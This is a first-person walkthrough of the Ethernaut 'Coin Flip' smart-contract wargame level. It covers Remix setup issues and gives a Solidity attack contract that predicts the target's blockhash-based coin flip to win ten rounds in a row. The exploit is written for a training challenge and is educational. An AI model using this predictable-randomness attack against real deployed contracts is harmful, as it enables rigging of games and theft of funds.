# Coin Flip

This level is really challenging...

Well, I am the king endowed with IQ not it. So, I summoned the great community
of ethereum hackers and with their backing there has been some progress.

I found out, by googling this
[article](https://medium.com/@nicolezhu/ethernaut-lvl-3-walkthrough-how-to-abuse-psuedo-randomness-in-smart-contracts-4cc06bb82570)
on medium that provided a way.

I had to use [Remix](remix.ethereum.org) online editor for this level. The first
issue I got was that the math library can't be found.

Googling again, I found an issue
[here](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/1824) on
the SafeMath's github repo that helped me resolved this blocker.

By prefixing the import link with `https://github.com/OpenZeppelin/` resolved
the _can't be found issue_.

I also had to change the Solidity version I was using to version 0.6.0. Doing
this, issue of naming the constructor function same as the contract name in
earlier version of Solidity showed up.

I only needed to **read the error message** to resolve the issue. I changed the
name simply to `constructor()` and that was it.

Then `block.blockhash()` has also deprecated and it now just `blockhash()`.

So, I made a custom contract similar to the CoinFlip contract: `hackCoinFlip`,
followed the process in CoinFlip and ensure to always pass in the boolean state
to always set `bool side` to **false**.

```solidity
import 'https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x525262E283CCB7793E0b9a479DFbd0Ad561b14b8);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
         originalContract.flip(_guess);
        } else {
          originalContract.flip(!_guess);
        }
    }
}
```

I deployed the contract, `hackCoinFlip`, 10 successful times to pass this stage.

It's been really challenging and adventorous for me.

On to the next challenge.
